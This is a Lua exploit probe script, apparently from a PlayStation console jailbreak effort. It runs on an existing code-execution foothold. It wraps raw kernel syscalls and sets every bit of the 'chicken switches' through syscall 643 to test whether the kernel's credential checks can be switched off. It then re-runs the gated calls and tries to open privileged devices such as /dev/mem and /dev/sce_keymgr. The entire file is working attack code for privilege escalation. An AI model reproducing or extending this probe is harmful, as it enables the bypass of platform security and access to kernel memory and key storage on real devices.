-- CRASH_CLASS: LOW
-- PROBE 701a: 643 set_chicken_switches OR's bits into a kernel struct at +0xa34.
-- Ask whether that struct gates the Sony credential checks: set every bit, then
-- re-run the gated calls and try the privileged device opens.
print("=== PROBE 701a: CHICKEN SWITCHES VS THE CREDENTIAL GATES ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function c6(n,a,b,c,d,e,f)
  local o,r=pcall(function() return mk(n)(U(a or 0),U(b or 0),U(c or 0),U(d or 0),U(e or 0),U(f or 0)) end)
  if o then return N(r) end return -999
end
local pid=N(native.fcall_with_rax(syscall.pipe.fn_addr,20))
print(string.format("[A] pid=%d",pid))
local page=memory.alloc(0x1000)
local h=memory.alloc(0x40)
local name="sceKernelGetProcessId"
for i=1,#name do pcall(function() memory.write_byte(N(h)+i-1,string.byte(name,i)) end) end
pcall(function() memory.write_byte(N(h)+#name,0) end)
local function probe(tag)
  local r1=c6(591,0x2001,N(h),N(page))
  local r2=c6(594,N(h),0,0)
  local r3=c6(622,N(page),0,0,0)
  local r4=c6(563,pid)
  local r5=c6(564,pid)
  local r6=c6(565,pid,0,0x310700000)
  local r7=c6(566,pid,6,0x310700000)
  local r8=c6(596,0)
  local r9=c6(659,N(page),0,0)
  local r10=c6(649,0x2001,1,N(page),0x100)
  print(string.format("[%s] 591=%d 594=%d 622=%d 563=%d 564=%d 565=%d 566=%d 596=%d 659=%d 649=%d",
    tag,r1,r2,r3,r4,r5,r6,r7,r8,r9,r10))
end
probe("B-before")
print(string.format("[C] 643(0xFFFFFFFF) rv=%d",c6(643,0xFFFFFFFF)))
print(string.format("[D] again rv=%d",c6(643,0xFFFFFFFF)))
probe("E-after")
for _,path in ipairs({"/dev/mem","/dev/console","/dev/power","/dev/sce_keymgr","/dev/io"}) do
  local b=memory.alloc(#path+1)
  for i=1,#path do pcall(function() memory.write_byte(N(b)+i-1,string.byte(path,i)) end) end
  pcall(function() memory.write_byte(N(b)+#path,0) end)
  local fd=c6(5,N(b),2,0)
  print(string.format("[F] open %s -> %d",path,fd))
  if fd>=0 then pcall(function() c6(6,fd) end) end
end
print(string.format("[Z] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
